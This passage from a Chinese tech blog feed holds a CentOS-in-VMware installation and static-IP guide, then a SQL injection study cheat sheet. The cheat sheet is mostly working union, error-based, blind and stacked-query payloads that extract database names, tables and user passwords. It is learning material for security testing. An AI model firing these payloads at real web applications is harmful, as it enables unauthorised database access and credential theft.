src="https://img-blog.csdn.net/20180711223917420?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/0b920b4159a48142576f5d229a719495.png"></p><ol start="7"><li>处理器与内存的分配</li></ol><p>处理器分配要根据自己的实际需求来分配。在使用过程中 CPU 不够的话是可以再增加的。这次只做安装 CentOS 演示，所以处理器与核心都选 1.</p><p><img src="https://img-blog.csdnimg.cn/img_convert/16ba0052da2de4c94b1b102d42f4158e.png"><img src="https://img-blog.csdn.net/20180711223929865?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>内存也是要根据实际的需求分配。我的宿主机内存是 8G 所以我给虚拟机分配 2G 内存。</p><p><img src="https://img-blog.csdn.net/20180711223943268?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/315ac15d6b09449a80f6884ab47a38b1.png"></p><ol start="8"><li>网络连接类型的选择，网络连接类型一共有桥接、NAT、仅主机和不联网四种。</li></ol><p>桥接：选择桥接模式的话虚拟机和宿主机在网络上就是平级的关系，相当于连接在同一交换机上。</p><p>NAT：NAT 模式就是虚拟机要联网得先通过宿主机才能和外面进行通信。</p><p>仅主机：虚拟机与宿主机直接连起来</p><p>桥接与 NAT 模式访问互联网过程，如下图所示</p><p><img src="https://img-blog.csdn.net/20180711224004659?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>桥接与 NAT 区别</p><p>这里选择桥接模式</p><p><img src="https://img-blog.csdn.net/20180711224016785?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"><img src="https://img-blog.csdnimg.cn/img_convert/0a07bc5585641e1e361e75578db1fc22.png"></p><ol start="9"><li>其余两项按虚拟机默认选项即可</li></ol><p><img src="https://img-blog.csdn.net/20180711224042387?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="10"><li>磁盘容量</li></ol><p>磁盘容量暂时分配 100G 即可后期可以随时增加，不要勾选立即分配所有磁盘，否则虚拟机会将 100G 直接分配给 CentOS，会导致宿主机所剩硬盘容量减少。</p><p>勾选将虚拟磁盘拆分成多个文件，这样可以使虚拟机方便用储存设备拷贝复制。</p><p><img src="https://img-blog.csdn.net/20180711224059391?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="11"><li>磁盘名称，默认即可</li></ol><p><img src="https://img-blog.csdn.net/20180711224115667?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="12"><li>取消不需要的硬件</li></ol><p>点击自定义硬件</p><p><img src="https://img-blog.csdn.net/2018071122413290?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>选择声卡、打印机等不需要的硬件然后移除。</p><p><img src="https://img-blog.csdn.net/20180711224147231?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="13"><li>点击完成，已经创建好虚拟机。</li></ol><p><img src="https://img-blog.csdn.net/20180711224200707?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>3. 安装 CentOS</strong></p><ol><li>连接光盘</li></ol><p>右击刚创建的虚拟机，选择设置</p><p><img src="https://img-blog.csdn.net/20180711224217850?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>先选择 CD&#x2F;DVD，再选择使用 ISO 映像文件，最后选择浏览找到下载好的镜像文件。启动时连接一定要勾选上后确定。</p><p><img src="https://img-blog.csdn.net/20180711224233121?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="2"><li>开启虚拟机</li></ol><p><img src="https://img-blog.csdn.net/20180711224302639?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><ol start="3"><li>安装操作系统</li></ol><p>开启虚拟机后会出现以下界面</p><ol><li>Install CentOS 7 安装 CentOS 7</li><li>Test this media &amp; install CentOS 7 测试安装文件并安装 CentOS 7</li><li>Troubleshooting 修复故障</li></ol><p>选择第一项，安装直接 CentOS 7，回车，进入下面的界面</p><p><img src="https://img-blog.csdnimg.cn/img_convert/12d7de06df36016247c4a8ddcb38f478.png"><img src="https://img-blog.csdn.net/20180711224323926?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>选择安装过程中使用的语言，这里选择英文、键盘选择美式键盘。点击 Continue</p><p><img src="https://img-blog.csdn.net/2018071122433632?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>首先设置时间</p><p><img src="https://img-blog.csdn.net/2018071122434772?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>时区选择上海，查看时间是否正确。然后点击 Done</p><p><img src="https://img-blog.csdn.net/20180711224410105?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>选择需要安装的软件</p><p><img src="https://img-blog.csdn.net/20180711224421911?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>选择 Server with Gui，然后点击 Done</p><p><img src="https://img-blog.csdn.net/20180711224438720?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>选择安装位置，在这里可以进行磁盘划分。</p><p><img src="https://img-blog.csdn.net/20180711224452307?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>选择 i wil configure partitioning（我将会配置分区），然后点击 done</p><p><img src="https://img-blog.csdn.net/20180711224505907?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>如下图所示，点击加号，选择 &#x2F; boot，给 boot 分区分 200M。最后点击 Add</p><p><img src="https://img-blog.csdn.net/20180711224522794?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>然后以同样的办法给其他三个区分配好空间后点击 Done</p><p><img src="https://img-blog.csdn.net/20180711224533382?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>然后会弹出摘要信息，点击 AcceptChanges(接受更改)</p><p><img src="https://img-blog.csdn.net/20180711224549412?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>设置主机名与网卡信息</p><p><img src="https://img-blog.csdn.net/20180711224603320?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>首先要打开网卡，然后查看是否能获取到 IP 地址 (我这里是桥接)，再更改主机名后点击 Done。</p><p><img src="https://img-blog.csdn.net/20180711224618785?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>最后选择 Begin Installation(开始安装)</p><p><img src="https://img-blog.csdn.net/2018071122463197?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>设置 root 密码</p><p><img src="https://img-blog.csdn.net/2018071122464660?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>设置 root 密码后点击 Done</p><p><img src="https://img-blog.csdn.net/20180711224658899?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>点击 USER CREATION 创建管理员用户</p><p><img src="https://img-blog.csdn.net/20180711224711277?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>输入用户名密码后点击 Done</p><p><img src="https://img-blog.csdn.net/2018071122472498?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>等待系统安装完毕重启系统即可</p><p><img src="https://img-blog.csdn.net/20180711224741348?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>以上就是本文的全部内容，希望对大家的学习有所帮助。</p><p><strong>以下为我自己整理的克隆虚拟机和设置固定 IP 的方法，记录一下，以防忘记：</strong></p><p><strong><strong>桥接模式网络配置</strong></strong></p><p><strong>1、配置 ip 地址等信息在 &#x2F; etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33 文件里做如下配置：</strong></p><p> 命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;   # 网络类型为以太网</span><br><span class="line">BOOTPROTO=&quot;static&quot;  # 手动分配ip</span><br><span class="line">  # 网卡设备名，设备名一定要跟文件名一致</span><br><span class="line">DEVICE=&quot;ens33&quot;  # 网卡设备名，设备名一定要跟文件名一致</span><br><span class="line">ONBOOT=&quot;yes&quot;  # 该网卡是否随网络服务启动</span><br><span class="line">IPADDR=&quot;192.168.220.101&quot;  # 该网卡ip地址就是你要配置的固定IP，如果你要用xshell等工具连接，220这个网段最好和你自己的电脑网段一致，否则有可能用xshell连接失败</span><br><span class="line">GATEWAY=&quot;192.168.220.2&quot;   # 网关</span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;   # 子网掩码</span><br><span class="line">DNS1=&quot;8.8.8.8&quot;    # DNS，8.8.8.8为Google提供的免费DNS服务器的IP地址</span><br></pre></td></tr></table></figure><p>修改如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">命令：</span><br><span class="line"> </span><br><span class="line">vi /etc/sysconfig/network</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">修改：</span><br><span class="line"> </span><br><span class="line">NETWORKING=yes # 网络是否工作，此处一定不能为no</span><br></pre></td></tr></table></figure><p><strong>2、配置网络工作</strong></p><p>在 &#x2F; etc&#x2F;sysconfig&#x2F;network 文件里增加如下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld # 临时关闭防火墙</span><br><span class="line">systemctl disable firewalld # 禁止开机启动</span><br></pre></td></tr></table></figure><p>3、<strong><strong>配置公共 DNS 服务 (可选)</strong></strong></p><p>在 &#x2F; etc&#x2F;resolv.conf 文件里增加如下配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.220.103（你锁修改的主机IP）   xxxxxxxx(你要的主机名字)</span><br></pre></td></tr></table></figure><p>4、<strong><strong>关闭防火墙</strong></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld # 临时关闭防火墙</span><br><span class="line">systemctl disable firewalld # 禁止开机启动</span><br></pre></td></tr></table></figure><p>5、<strong><strong>重启网络服务</strong></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure><p> 下面是克隆虚拟机：</p><p>先查看虚拟机的网关</p><p><img src="https://img-blog.csdnimg.cn/20181118133935906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhYnl4dWU=,size_16,color_FFFFFF,t_70"></p><p>2、将要克隆的虚拟机关机，右键点击要克隆的虚拟机：</p><p>右键点击虚拟机，选择 “管理”、“克隆”</p><p><img src="https://img-blog.csdn.net/20180704204058261?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>然后下一步</p><p><img src="https://img-blog.csdn.net/20180704204226663?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>再下一步</p><p><img src="https://img-blog.csdn.net/20180704204252548?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>选择第二个 “创建完整克隆”，后下一步</p><p><img src="https://img-blog.csdn.net/20180704204326257?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>给自己的克隆机命名、选择位置后点击 “完成”。</p><p><img src="https://img-blog.csdn.net/20180704204850768?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>然后就开始克隆了，时间不会太久，整个过程大概 1~2 分钟。</p><p>完成克隆后点击关闭即克隆成功了。此时是可以在虚拟机列表中看到刚刚克隆的虚拟机 “Clone” 的。如下：</p><p><img src="https://img-blog.csdn.net/20180704204944459?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pamljaHVpMjE1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>此时这个克隆出来的虚拟机和原虚拟机各个配置都是一样的，我们接下来要对网络、主机名等进行配置。<br>修改配置文件 <strong>&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33 中的 IPADDR</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IPADDR=&quot;192.168.220.102&quot;</span><br></pre></td></tr></table></figure><p>修改主机名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl set-hostname   xxxx(你要的主机名字)</span><br></pre></td></tr></table></figure><p> 修改 hosts 文件，将名字和 IP 建立联系</p><p>输入命令 “vi &#x2F;etc&#x2F;hosts” 后，在配置文件中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.220.103（你锁修改的主机IP）   xxxxxxxx(你要的主机名字)</span><br></pre></td></tr></table></figure><p>重启: reboot</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入详解</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="一、sql-注入概述"><a href="#一、sql-注入概述" class="headerlink" title="一、sql 注入概述"></a>一、sql 注入概述</h2><p> SQL 注入即是指 web 应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在 web 应用程序中事先定义好的查询语句的结尾上添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息, 在实战和测试中，难免会遇见到一些 sql 注入，下面，我将总结一些常用 sql 注入中的不同姿势。</p><h2 id="二、寻找-sql-注入"><a href="#二、寻找-sql-注入" class="headerlink" title="二、寻找 sql 注入"></a>二、寻找 sql 注入</h2><p>测试注入点：</p><p>1. 在参数后面添加单引号或双引号，查看返回包，如果报错或者长度变化，可能存在 Sql 注入</p><p>注入点判断：<code>id=1&#39;（常见）</code>id&#x3D;1”id&#x3D;1’) id&#x3D;1’)) id&#x3D;1”) id&#x3D;1”))</p><p>2. 通过构造 get、post、cookie 请求再相应的 http 头信息等查找敏感喜喜</p><p>3. 通过构造一些语句，检测服务器中响应的异常</p><h2 id="三、sql-注入的类型"><a href="#三、sql-注入的类型" class="headerlink" title="三、sql 注入的类型"></a>三、sql 注入的类型</h2><p>附上自己整理的思维导图学习</p><p><img src="https://image.3001.net/images/20220714/1657765090_62cf7ce22bc5cb101dc1b.png!small"></p><p>常见的数据库类型，分为关系型数据库和非关系型数据库</p><p>关系型数据库有 <code>Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft Access 和 MySQL</code>等。</p><p>非关系型数据库有 <code>Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase</code>等</p><h2 id="Mysql-注入"><a href="#Mysql-注入" class="headerlink" title="Mysql 注入"></a>Mysql 注入</h2><p><img src="https://image.3001.net/images/20220714/1657765211_62cf7d5ba9f990b10b6f3.png!small"></p><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>数字型：</p><p>测试步骤：</p><p>（1） 加单引号，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3’；</p><p>对应的 sql：select * from table where id&#x3D;3’ 这时 sql 语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加 and 1&#x3D;1 ，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;1；</p><p>对应的 sql：select * from table where id&#x3D;3’ and 1&#x3D;1 语句执行正常，与原始页面没有差异；</p><p>（3） 加 and 1&#x3D;2，URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;2；</p><p>对应的 sql：select * from table where id&#x3D;3 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异；</p><p>字符型</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name&#x3D;’admin’’；</p><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加’and 1&#x3D;1 此时 sql 语句为：select * from table where name&#x3D;’admin’and 1&#x3D;1’ ，也无法进行注入，还需要通过注释符号将其绕过；</p><p>因此，构造语句为：select * from table where name &#x3D;’admin’ and 1&#x3D;–’ 可成功执行返回结果正确；</p><p>（3） 加 and 1&#x3D;2— 此时 sql 语句为：select * from table where name&#x3D;’admin’ and 1&#x3D;2–’则会报错；</p><p>如果满足以上三点，可以判断该 url 为字符型注入。</p><p>判断列数：</p><p>?id&#x3D;1’ order by 4# 报错</p><p>?id&#x3D;1’ order by 3# 没有报错，说明存在 3 列</p><p>爆出数据库：</p><p>?id&#x3D;-1’ union select 1,database(),3–+</p><p>?id&#x3D;-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata#</p><p>爆出数据表：</p><p>?id&#x3D;-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’数据库’#</p><p>爆出字段：</p><p>?id&#x3D;-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’数据表’#</p><p>爆出数据值：</p><p>?id&#x3D;-1’ union select 1,group_concat(0x7e, 字段, 0x7e),3 from 数据库名. 数据表名 –+</p><p>拓展一些其他函数：</p><p>system_user() 系统用户名</p><p>user() 用户名</p><p>current_user 当前用户名</p><p>session_user() 连接数据库的用户名</p><p>database() 数据库名</p><p>version() MYSQL 数据库版本</p><p>load_file() MYSQL 读取本地文件的函数</p><p>@@datadir 读取数据库路径</p><p>@@basedir MYSQL 安装路径</p><p>@@version_compile_os 操作系统</p><p>多条数据显示函数：</p><p>concat()、group_concat()、concat_ws()</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>extractvalue 函数：</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version),0x7e))–+ (爆出版本号)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select @@version_compile_os),0x7e))–+ (爆出操作系统)</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))–+ （爆数据库）</p><p>?id&#x3D;1’and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e))–+ （爆数据表）</p><p>?id&#x3D;1’and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e))–+（爆字段）</p><p>?id&#x3D;1’ and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))–+ （爆数据）</p><p>updatexml 函数：</p><p>细节问题： extractvalue() 基本一样，改个关键字 updatexml 即可, 与 extractvalue 有个很大的区别实在末尾注入加上，如：（1，concat(select @@version),1), 而 extractvalue 函数末尾不加 1（数值）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),<strong><code>1</code></strong>)–+ （爆数据库）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x7e),1)–+ （爆数据表）</p><p>?id&#x3D;1’and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 3,1),0x7e),1)–+ （爆字段）</p><p>?id&#x3D;1’ and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)–+</p><p>exp 函数溢出错误：</p><p>在 mysql&gt;5.5.53 时，则不能返回查询结果</p><p>floor 函数：</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a–+</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ (爆数据库，不断改变 limit 得到其他)</p><p>?id&#x3D;1’union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出 users 表）</p><p>?id&#x3D;1’union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出 password 字段）</p><p>?id&#x3D;1’ union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a–+ （爆出数值）</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>判断注入点：</p><p>?id&#x3D;1’ and sleep(5)–+ &#x2F;&#x2F; 正常休眠</p><p>?id&#x3D;1” and sleep(5)–+ &#x2F;&#x2F; 无休眠</p><p>?id&#x3D;1’) and sleep(5)–+&#x2F;&#x2F; 无休眠</p><p>?id&#x3D;1”) and sleep(5)–+&#x2F;&#x2F; 无休眠</p><p>?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(10),1)–+</p><p>爆出数据库：</p><p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))–+</p><p>通过判断服务器没有睡眠，ascii 码转换 115 为 s ，那么就得出数据库第一个字符为 s, 下面就可以一次类推了, 就不一</p><p>substr(database(),N,1) 可以通过改变 N 的值来判断数据的地几个字符为什么</p><p>爆出数据表：</p><p>?id&#x3D;1’and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;”security”limit 0,1),1,1)))&#x3D;101,sleep(5),1)– -</p><p>解释：security 的第一张表的第一个字符 ascii 为 101，为字符 e</p><p> limit 0,1),N,1 还是改变 N 的的得出第二个字符</p><p>再判断字符（ascii 判断）</p><p>?id&#x3D;1” and if(ascii(substr(database(),1,1))&gt;115,1,sleep(3))–+</p><p>（left 语句判断）</p><p>?id&#x3D;1’and if(left(database(),1)&#x3D;’s’,sleep(10),1) –+</p><p>?id&#x3D;1’and if(left(database(),2)&#x3D;’sa’,sleep(10),1) –+</p><p>Substring 函数判断</p><p>type&#x3D;if(substring((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1&#x3D;’a’),11111,sleep(1))–+</p><p>附上一篇文档（盲注脚本）：<a href="https://blog.csdn.net/weixin/_41598660/article/details/105162513">https://blog.csdn.net/weixin\_41598660/article/details/105162513</a></p><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>Left 判断</p><p>?id&#x3D;1’and left(database(),1)&#x3D;’s’ –+</p><p>?id&#x3D;1’and left(database(),2) &gt;’sa’ –+</p><p>Like 语句判断</p><p>?id&#x3D;1’and (select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)like’e%’–+</p><p>Ascii 语句判断</p><p>and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;115–+</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>?id&#x3D;1’ order by 3%23</p><p>?id&#x3D;1’;show tables%23</p><p>?id&#x3D;-1’;show columns from <code>1919810931114514</code>%23</p><p>?id&#x3D;1’; insert into users(id,username,password) values(88,’aaa’,’bbb’)#  </p><p><img src="https://image.3001.net/images/20220714/1657765459_62cf7e536914d9a20eebd.png!small"></p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入一般是用于白盒测试、黑盒测试就算是找到注入也没办法攻击。  </p><p><img src="https://image.3001.net/images/20220714/1657765520_62cf7e901e5532a44c092.png!small"></p><p>博客链接：<a href="https://zhuanlan.zhihu.com/p/39917830">https://zhuanlan.zhihu.com/p/39917830</a></p><h3 id="加密解密注入"><a href="#加密解密注入" class="headerlink" title="加密解密注入"></a>加密解密注入</h3><p>Cookie: uname&#x3D;YWRtaW4%3D</p><p>YWRtaW4%3D 这是一个 base64 